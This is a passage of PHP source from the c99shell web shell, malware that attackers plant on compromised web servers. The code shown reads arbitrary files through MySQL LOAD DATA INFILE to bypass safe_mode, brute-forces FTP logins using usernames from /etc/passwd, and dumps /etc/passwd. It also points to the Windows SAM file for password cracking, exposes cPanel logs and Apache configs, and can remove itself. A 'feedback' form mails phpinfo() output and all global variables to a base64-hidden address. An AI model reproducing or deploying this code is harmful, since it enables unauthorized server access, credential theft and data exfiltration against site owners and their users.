htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php }
   if (!empty($sql_act))
   {
    echo "&lt;hr size=\"1\" noshade&gt;";
    if ($sql_act == "newdb")
    {
     echo "&lt;b&gt;";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus")
    {
     $result = mysql_query("SHOW STATUS", $sql_sock); 
     echo "&lt;center&gt;&lt;b&gt;Server-status variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";} 
     echo "&lt;/table&gt;&lt;/center&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars")
    {
     $result = mysql_query("SHOW VARIABLES", $sql_sock); 
     echo "&lt;center&gt;&lt;b&gt;Server variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";} 
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "processes")
    {
     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "&lt;b&gt;Killing process #".$kill."... ok. he is dead, amen.&lt;/b&gt;";}
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock); 
     echo "&lt;center&gt;&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;ID&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;USER&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;HOST&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;DB&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;COMMAND&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;TIME&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;STATE&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;INFO&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;td&gt;".$row[2]."&lt;/td&gt;&lt;td&gt;".$row[3]."&lt;/td&gt;&lt;td&gt;".$row[4]."&lt;/td&gt;&lt;td&gt;".$row[5]."&lt;/td&gt;&lt;td&gt;".$row[6]."&lt;/td&gt;&lt;td&gt;".$row[7]."&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"&gt;&lt;u&gt;Kill&lt;/u&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";}
     echo "&lt;/table&gt;";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = false;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "&lt;b&gt;Error in reading file (permision denied)!&lt;/b&gt;";}
      else
      {
       for ($i=0;$i&lt;mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = ""; 
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "&lt;b&gt;File \"".$sql_getfile."\" does not exists or empty!&lt;/b&gt;&lt;br&gt;";}
       else {echo "&lt;b&gt;File \"".$sql_getfile."\":&lt;/b&gt;&lt;br&gt;".nl2br(htmlspecialchars($f))."&lt;br&gt;";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); //comment it if you want to leave database
    }
   }
  }
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 if ($sql_sock)
 {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected &lt; 0)){$affected = 0;}
  echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Affected rows: ".$affected."&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";
 }
 echo "&lt;/table&gt;";
}
if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: access denied";}
  echo "&lt;br&gt;&lt;br&gt;";
 }
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "&lt;b&gt;Ftp Quick brute:&lt;/b&gt;&lt;br&gt;";
 if (!win) {echo "This functions not work in Windows!&lt;br&gt;&lt;br&gt;";}
 else
 {
  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
   if ($fqb_onlywithsh) {$true = (!in_array($sh,array("/bin/false","/sbin/nologin")));}
   else {$true = true;}
   if ($true)
   {
    $sock = @ftp_connect($host,$port,$timeout);
    if (@ftp_login($sock,$login,$pass))
    {
     echo "&lt;a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"&gt;&lt;b&gt;Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"&lt;/b&gt;&lt;/a&gt;.&lt;br&gt;";
     ob_flush();
     return true;
    }
   }
  }
  if (!empty($submit))
  {
   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
   $fp = fopen("/etc/passwd","r");
   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
   else
   {
    if ($fqb_logging)
    {
     if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
     else {$fqb_logfp = false;}
     $fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
     if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    }
    ob_flush();
    $i = $success = 0;
    $ftpquick_st = getmicrotime();
    while(!feof($fp))
    { 
     $str = explode(":",fgets($fp,2048));
     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
      echo "&lt;b&gt;Connected to ".$SERVER_NAME." with login \"".$str[0]."\" and password \"".$str[0]."\"&lt;/b&gt;&lt;br&gt;";
      $fqb_log .= "Connected to ".$SERVER_NAME." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      $success++;
      ob_flush();
     }
     if ($i &gt; $fqb_lenght) {break;}
     $i++;
    } 
    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
    echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Done!&lt;/b&gt;&lt;br&gt;Total time (secs.): ".$ftpquick_t."&lt;br&gt;Total connections: ".$i."&lt;br&gt;Success.: &lt;font color=\"green\"&gt;&lt;b&gt;".$success."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;Unsuccess.:".($i-$success)."&lt;/b&gt;&lt;br&gt;Connects per second: ".round($i/$ftpquick_t,2)."&lt;br&gt;";
    $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
  {
   $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
   $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
   echo "&lt;form method=\"POST\"&gt;&lt;br&gt;Read first: &lt;input type=\"text\" name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"&gt;&lt;br&gt;&lt;br&gt;Users only with shell?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"&gt;&lt;br&gt;&lt;br&gt;Logging?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked&gt;&lt;br&gt;Logging to file?&nbsp;&lt;input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"&gt;&lt;br&gt;Logging to e-mail?&nbsp;&lt;input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Brute\"&gt;&lt;/form&gt;";
  }
 }
}
if ($act == "d")
{
 if (!is_dir($d)) {echo "&lt;center&gt;&lt;b&gt;Permision denied!&lt;/b&gt;&lt;/center&gt;";}
 else
 {
  echo "&lt;b&gt;Directory information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;";
  if (!$win)
  {
   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";      
   $tmp = posix_getpwuid(fileowner($d));
   if ($tmp["name"] == "") {echo fileowner($d)."/";}
   else {echo $tmp["name"]."/";}
   $tmp = posix_getgrgid(filegroup($d));
   if ($tmp["name"] == "") {echo filegroup($d);}
   else {echo $tmp["name"];}
  }
  echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&d=".urlencode($d)."\"&gt;&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;&lt;/a&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
 }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); exit;}
if ($act == "security")
{
 echo "&lt;center&gt;&lt;b&gt;Server security information:&lt;/b&gt;&lt;/center&gt;&lt;b&gt;Software:&lt;/b&gt; ".PHP_OS.", ".$SERVER_SOFTWARE."&lt;br&gt;&lt;b&gt;Safe-Mode: ".$hsafemode."&lt;/b&gt;&lt;br&gt;&lt;b&gt;Open base dir: ".$hopenbasedir."&lt;/b&gt;&lt;br&gt;";
 if (!$win)
 {
  if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   echo "&lt;b&gt;*nix /etc/passwd:&lt;/b&gt;&lt;br&gt;";
   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
   echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"security\"&gt;&lt;input type=\"hidden\" name=\"nixpasswd\" value=\"1\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\"&gt;&nbsp;&lt;input type=\"submit\" value=\"View\"&gt;&lt;/form&gt;&lt;br&gt;";
   $i = $nixpwd_s;
   while ($i &lt; $nixpwd_e)
   {
    $uid = posix_getpwuid($i);
    if ($uid)
    {
     $uid["dir"] = "&lt;a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\"&gt;".$uid["dir"]."&lt;/a&gt;";
     echo join(":",$uid)."&lt;br&gt;";
    }
    $i++;
   }
  }
  else {echo "&lt;br&gt;&lt;a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"&gt;&lt;b&gt;&lt;u&gt;Get /etc/passwd&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";
  if (file_get_contents($v)) {echo "&lt;b&gt;&lt;font color=\"red\"&gt;You can't crack winnt passwords(".$v.") &lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
  else {echo "&lt;b&gt;&lt;font color=\"green\"&gt;You can crack winnt passwords. &lt;a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"&gt;&lt;u&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;, and use lcp.crack+ Â©.&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 }
 if (file_get_contents("/etc/userdomains")) {echo "&lt;b&gt;&lt;font color=\"green\"&gt;&lt;a href=\"".$surl."act=f&f=userdomains&d=/etc/&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;View cpanel user-domains logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/var/cpanel/accounting.log")) {echo "&lt;b&gt;&lt;font color=\"green\"&gt;&lt;a href=\"".$surl."act=f&f=accounting.log&d=/var/cpanel/&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;View cpanel logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "&lt;b&gt;&lt;font color=\"green\"&gt;&lt;a href=\"".$surl."act=f&f=httpd.conf&d=/usr/local/apache/conf/&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
 if (file_get_contents("/etc/httpd.conf")) {echo "&lt;b&gt;&lt;font color=\"green\"&gt;&lt;a href=\"".$surl."act=f&f=httpd.conf&d=/etc/&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "encoder")
{
 echo "&lt;script&gt;function set_encoder_input(text) {document.forms.encoder.input.value = text;}&lt;/script&gt;&lt;center&gt;&lt;b&gt;Encoder:&lt;/b&gt;&lt;/center&gt;&lt;form name=\"encoder\" method=\"POST\"&gt;&lt;b&gt;Input:&lt;/b&gt;&lt;center&gt;&lt;textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5&gt;".@htmlspecialchars($encoder_input)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"calculate\"&gt;&lt;br&gt;&lt;br&gt;&lt;/center&gt;&lt;b&gt;Hashes&lt;/b&gt;:&lt;br&gt;&lt;center&gt;";
 foreach(array("md5","crypt","sha1","crc32") as $v)
 {
  echo $v." - &lt;input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly&gt;&lt;br&gt;";
 }
 echo "&lt;/center&gt;&lt;b&gt;Url:&lt;/b&gt;&lt;center&gt;&lt;br&gt;urlencode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly&gt;
 &lt;br&gt;urldecode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urldecode($encoder_input)."\" readonly&gt;
 &lt;br&gt;&lt;/center&gt;&lt;b&gt;Base64:&lt;/b&gt;&lt;center&gt;base64_encode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly&gt;&lt;/center&gt;";
 echo "&lt;center&gt;base64_decode - ";
 if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "&lt;input type=text size=35 value=\"failed\" disabled readonly&gt;";}
 else
 {
  $debase64 = base64_decode($encoder_input);
  $debase64 = str_replace("&#92;&#48;","[0]",$debase64);
  $a = explode("\r\n",$debase64);
  $rows = count($a);
  $debase64 = htmlspecialchars($debase64);
  if ($rows == 1) {echo "&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly&gt;";}
  else {$rows++; echo "&lt;textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly&gt;".$debase64."&lt;/textarea&gt;";}
  echo "&nbsp;&lt;a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"&gt;&lt;b&gt;^&lt;/b&gt;&lt;/a&gt;";
 }
 echo "&lt;/center&gt;&lt;br&gt;&lt;b&gt;Base convertations&lt;/b&gt;:&lt;center&gt;dec2hex - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
 $c = strlen($encoder_input);
 for($i=0;$i&lt;$c;$i++)
 {
  $hex = dechex(ord($encoder_input[$i]));
  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
 }
 echo "\" readonly&gt;&lt;br&gt;&lt;/center&gt;&lt;/form&gt;";
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "&lt;center&gt;&lt;b&gt;Buffer is empty!&lt;/b&gt;&lt;/center&gt;";}
 else {echo "&lt;b&gt;File-System buffer&lt;/b&gt;&lt;br&gt;&lt;br&gt;"; $ls_arr = $arr; $disp_fullpath = true; $act = "ls";}
}
if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; exit; }
  else {echo "&lt;center&gt;&lt;b&gt;Can't delete ".__FILE__."!&lt;/b&gt;&lt;/center&gt;";}
 }
 else
 {
  if (!empty($rndcode)) {echo "&lt;b&gt;Error: incorrect confimation!&lt;/b&gt;";}
  $rnd = rand(0,9).rand(0,9).rand(0,9);
  echo "&lt;form method=\"POST\"&gt;&lt;b&gt;Self-remove: ".__FILE__." &lt;br&gt;&lt;b&gt;Are you sure?&lt;br&gt;For confirmation, enter \"".$rnd."\"&lt;/b&gt;:&nbsp;&lt;input type=\"hidden\" name=\"rndcode\" value=\"".$rnd."\"&gt;&lt;input type=\"text\" name=\"submit\"&gt;&nbsp;&lt;input type=\"submit\" value=\"YES\"&gt;&lt;/form&gt;";
 }
}
if ($act == "feedback")
{
 $suppmail = base64_decode("Yzk5c2hlbGxAaW5ib3gucnU=");
 if (!empty($submit))
 {
  $ticket = substr(md5(microtime()+rand(1,1000)),0,6);
  $body = "c99shell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
   phpinfo();
   $phpinfo = base64_encode(ob_get_contents());
   ob_clean();
   echo $tmp;
   $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
  }
  mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
  echo "&lt;center&gt;&lt;b&gt;Thanks for your feedback! Your ticket ID: ".$ticket.".&lt;/b&gt;&lt;/center&gt;";
 }
 else {echo "&lt;form method=\"POST\"&gt;&lt;b&gt;Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):&lt;br&gt;&lt;br&gt;Your name: &lt;input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"&gt;&lt;br&gt;&lt;br&gt;Your e-mail: &lt;input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"&gt;&lt;br&gt;&lt;br&gt;Message:&lt;br&gt;&lt;textarea name=\"fdbk_body\" cols=80 rows=10&gt;".htmlspecialchars($fdbk_body)."&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"&gt;&lt;br&gt;&lt;br&gt;Attach server-info * &lt;input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;There are no checking in the form.&lt;br&gt;&lt;br&gt;* - strongly recommended, if you report bug, because we need it for bug-fix.&lt;br&gt;&lt;br&gt;We understand languages: English, Russian.&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Send\"&gt;&lt;/form&gt;";}
}
if ($act == "search")
{
 echo "&lt;b&gt;Search in file-system:&lt;/b&gt;&lt;br&gt;";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $search_i_f = 0;
  $search_i_d = 0;
  $a = array
  (
   "name"=&gt;$search_name, "name_regexp"=&gt;$search_name_regexp,
   "text"=&gt;$search_text, "text_regexp"=&gt;$search_text_regxp,
   "text_wwo"=&gt;$search_text_wwo,
   "text_cs"=&gt;$search_text_cs,
   "text_not"=&gt;$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v) {c99fsearch($v);}
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "&lt;b&gt;No files found!&lt;/b&gt;";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = true;
   $act = "ls";
  }
 }
 echo "&lt;form method=\"POST\"&gt;
&lt;input type=\"hidden\" name=\"d\" value=\"".$dispd."\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"".$dspact."\"&gt;
&lt;b&gt;Search for (file/directory name): &lt;/b&gt;&lt;input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\"&gt;&nbsp;&lt;input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".gchds($search_name_regexp,1," checked")."&gt; - regexp
&lt;br&gt;&lt;b&gt;Search in (explode \";\"): &lt;/b&gt;&lt;input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"&gt;
&lt;br&gt;&lt;br&gt;&lt;b&gt;Text:&lt;/b&gt;&lt;br&gt;&lt;textarea name=\"search_text\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($search_text)."&lt;/textarea&gt;
&lt;br&gt;&lt;br&gt;&lt;input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".gchds($search_text_regexp,1," checked")."&gt; - regexp
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".gchds($search_text_wwo,1," checked")."&gt; - &lt;u&gt;w&lt;/u&gt;hole words only
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".gchds($search_text_cs,1," checked")."&gt; - cas&lt;u&gt;e&lt;/u&gt; sensitive
&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".gchds($search_text_not,1," checked")."&gt; - find files &lt;u&gt;NOT&lt;/u&gt; containing the text
&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Search\"&gt;&lt;/form&gt;";
 if ($act == "ls") {$dspact = $act; echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." directories, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).&lt;/b&gt;&lt;br&gt;&lt;br&gt;";}
}
if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "&lt;b&gt;Change file-mode with error:&lt;/b&gt; can't get current value.";}
 else
 {
  $form = true;
  if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = false; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "&lt;b&gt;Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")&lt;/b&gt;&lt;br&gt;".($err?"&lt;b&gt;Error:&lt;/b&gt; ".$err:"")."&lt;form action=\"".htmlspecialchars($surl)."\" method=\"POST\"&gt;&lt;input type=hidden name=d value=\"".htmlspecialchars($d)."\"&gt;&lt;input type=hidden name=f value=\"".htmlspecialchars($f)."\"&gt;&lt;input type=hidden name=act value=chmod&gt;&lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"")."&gt;eXecute&lt;/td&gt;&lt;td&gt;&lt;b&gt;Group&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[r] 